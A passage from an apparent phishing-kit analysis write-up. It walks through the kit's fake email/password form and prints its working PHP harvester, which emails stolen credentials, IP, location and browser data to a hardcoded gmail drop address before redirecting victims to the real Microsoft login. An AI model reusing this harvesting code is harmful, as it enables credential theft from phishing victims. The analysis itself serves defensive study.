   &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-group orangeclr&amp;#34;&lt;/span&gt;&amp;gt;
       &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;&amp;gt;Email Address&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;
       &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input-group mb-2 mr-sm-2 mb-sm-0&amp;#34;&lt;/span&gt;&amp;gt;
           &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input-group-addon&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width: 2.6rem&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-at&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
           &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;email&amp;#34;&lt;/span&gt;
                    &lt;span style=&#34;color:#a6e22e&#34;&gt;placeholder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you@example.com&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;autofocus&lt;/span&gt;&amp;gt;
       &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
   &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
   &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-group orangeclr&amp;#34;&lt;/span&gt;&amp;gt;
       &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&amp;gt;Password&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;
       &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input-group mb-2 mr-sm-2 mb-sm-0&amp;#34;&lt;/span&gt;&amp;gt;
           &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;input-group-addon&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;width: 2.6rem&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-key&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;i&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
           &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;
                  &lt;span style=&#34;color:#a6e22e&#34;&gt;placeholder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt;&amp;gt;
       &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
   &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
   &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gostepbtn&amp;#34;&lt;/span&gt;&amp;gt;
       &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit_btn&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Go to step 2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gostep&amp;#34;&lt;/span&gt; /&amp;gt;
   &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After the victim enters the credentials, these are sent to &lt;code&gt;emailcode/email.php&lt;/code&gt; with a POST. Let&amp;rsquo;s check what happens in there:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;submit_btn&amp;#39;&lt;/span&gt;])){
    $admin_email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;macdon161@gmail.com&amp;#34;&lt;/span&gt;;
    $email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
    $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
    $ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getenv&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span&gt;);
    $country &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ip_visitor_country&lt;/span&gt;();
    $region &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ip_visitor_region&lt;/span&gt;();
    $city &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ip_visitor_city&lt;/span&gt;();
    $adddate &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;date&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;D M d, Y g:i a&amp;#34;&lt;/span&gt;);
    $browser &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;admin_email&lt;/code&gt; contains the exfiltration email address for this instance of the phishing kit. So we can confirm that information is sent directly via email to the address specified in the variable.&lt;/p&gt;
&lt;p&gt;As it is possible to see in the code above, the email sent includes multiple information: credentials, IP address, date and User-Agent string. The kit also tries to obtain the country, region and city where the request was generated by performing a request to &lt;em&gt;geoplugin.net&lt;/em&gt; with &lt;code&gt;curl_init&lt;/code&gt; and providing the IP address. However - as of now - the service has moved to &lt;em&gt;geoplugin.com&lt;/em&gt;, thus these information cannot currently be collected by the kit.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// Always set content-type when sending HTML email
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$formname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logintype&amp;#39;&lt;/span&gt;];
&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ($formname) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;office&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login Type Selection -- Office &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Office login attempt -- &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$ip;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;outlook&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login Type Selection -- Outlook &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Outlook login attempt -- &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$ip;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;webmail&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login Type Selection -- Webmail &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Webmail login attempt -- &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$ip;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Login Type Selection -- other &lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
        $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;other login attempt -- &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$ip;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using a switch, the kit detects which type of credentials were submitted by the phished user, and it changes the message and the subject of the email accordingly.&lt;/p&gt;
&lt;p&gt;In the rest of the code the headers and body of the email are set, then the email is sent using &lt;code&gt;mail()&lt;/code&gt;. After that, the user is redirected to a login page of Microsoft: &lt;em&gt;&lt;a href=&#34;https://login.microsoftonline.com/common/oauth2&#34;&gt;https://login.microsoftonline.com/common/oauth2&lt;/a&gt;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$from &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Outlook &amp;lt;noreply&amp;gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// To send HTML mail, the Content-type header must be set
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$headers  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;MIME-Version: 1.0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-type: text/html; charset=iso-8859-1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// Create email headers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;From: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$from&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Reply-To: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$from&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;
    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;X-Mailer: PHP/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;phpversion&lt;/span&gt;();
$headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: text/html; charset=ISO-8859-1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// More headers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;$headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reply-To: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strip_tags&lt;/span&gt;($email) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Username/Email -- &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$email\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password -- &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$password\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IP --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$ip&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Country Detected --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$country&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Region Detected --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$region&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;City Detected --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$city&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Date --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$adddate&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
$message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Browser Detected --  &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$browser&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#75715e&#34;&gt;//send email
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;@&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mail&lt;/span&gt;($admin_email,$subject,$message);
&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: https://login.microsoftonline.com/common/oauth2&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;other-php-files&#34;&gt;Other php files&lt;/h2&gt;
&lt;p&gt;At this point, the workflow of the kit seems clear, however there are two php files that seem unrelated with the rest of the kit, because they are never called or included: &lt;code&gt;outlookcode/email.php&lt;/code&gt; and &lt;code&gt;aol.php&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;outlookcodeemailphp&#34;&gt;outlookcode/email.php&lt;/h3&gt;
&lt;p&gt;This file seems to have the same purpose of &lt;code&gt;emailcode/email.php&lt;/code&gt;, but is less sophisticated, as it does not contain the switch case to handle multiple phishing pages. Here is the code:&lt;/p&gt;
